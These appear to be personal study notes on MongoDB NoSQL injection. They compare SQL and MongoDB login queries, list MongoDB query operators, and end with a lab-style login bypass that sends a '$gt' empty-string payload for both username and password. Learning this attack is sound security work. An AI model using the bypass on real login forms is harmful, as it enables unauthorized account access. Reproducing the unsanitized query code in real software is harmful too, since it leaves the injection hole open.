Root cause of No SQL DB is same as SQL no sanitization just pass the input.
NoSQL databases do not use traditional SQL syntax and often rely on JSON or JavaScript, the injection techniques differ. These techniques exploit the specific query structure and capabilities of NoSQL systems.

Insql
```sql
SELECT * FROM members WHERE username = 'tmgm' AND password = 'tmgm';
```
In case of MongoDB, the equivalent login query would look as follows:
```nosql
db.members.find({"username": "tmgm", "password": "tmgm"});
```

```code
db.collection('members').find({
username: inputData.username,
password: inputData.password
});
```

MongoDB employs specific operators for query conditions that, if manipulated by an attacker, can alter the intended to outcome query.

MongoDB injection is typically exploited through the use of certain operators and used to change logic of query.
```
$gt     // Greater than
$lt     // Less than
$eq     // Equal to
$ne     // Not equal to
$regex  // Regular expression
$in     // Verify the presence of required data within a data structure, like an array
$exists // Determines the presence of a specific field

```

![[Screenshot_2025-07-23_14_50_26.png]]

it shows invalid credentials so we will use MongoDB operator to bypass this. we will use grater then operator.
![[Screenshot_2025-07-23_14_50_26 1.png]]
In database it wil execute as.
```
db.members.find ({"username": {"$gt": ""}, "password": {"$gt": ""} });
```
so It will return users whoes value is grater then emplty string.
![[Screenshot_2025-07-23_14_50_26 2.png]]
